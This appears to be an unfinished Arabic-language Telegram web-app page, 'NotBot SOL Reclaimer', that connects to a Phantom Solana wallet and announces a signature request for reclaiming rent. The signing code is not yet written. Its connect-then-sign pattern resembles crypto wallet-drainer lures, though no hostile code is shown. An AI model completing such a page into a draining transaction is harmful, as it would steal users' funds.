<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NotBot SOL Reclaimer</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background-color: #0b0e14; color: #ffffff; display: flex; align-items: center; justify-content: center; min-height: 100vh; font-family: sans-serif; }
        .card { background: #151a23; border: 1px solid #232a3b; border-radius: 16px; padding: 24px; width: 90%; max-width: 380px; text-align: center; }
        .btn { background: #ab9ff2; color: #000; border: none; border-radius: 12px; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="card">
        <h1>استرداد الرنت ⚡</h1>
        <p id="status">جاري البحث عن المحفظة...</p>
        <button class="btn" id="claimBtn" onclick="connectAndSign()">الاتصال والتوقيع</button>
    </div>

    <script>
        // 1. انتظر حتى تحمل المحفظة في المتصفح
        async function getProvider() {
            for (let i = 0; i < 20; i++) {
                if (window.solana && window.solana.isPhantom) return window.solana;
                await new Promise(resolve => setTimeout(resolve, 200));
            }
            return null;
        }

        async function connectAndSign() {
            const status = document.getElementById("status");
            const provider = await getProvider();

            if (!provider) {
                status.innerText = "⚠️ لم يتم العثور على Phantom. تأكد أنك في متصفح فانتوم.";
                // إعادة التوجيه كحل أخير
                window.location.href = "https://phantom.app/ul/browse/" + encodeURIComponent(window.location.href);
                return;
            }

            try {
                status.innerText = "جاري الاتصال...";
                const resp = await provider.connect();
                status.innerText = "✅ متصل: " + resp.publicKey.toString().slice(0, 6) + "...";
                alert("تم الاتصال بنجاح! الآن سيتم إرسال طلب التوقيع.");
                // هنا سيأتي كود التوقيع الفعلي لاحقاً
            } catch (err) {
                status.innerText = "❌ تم رفض الاتصال.";
            }
        }
    </script>
</body>
</html>
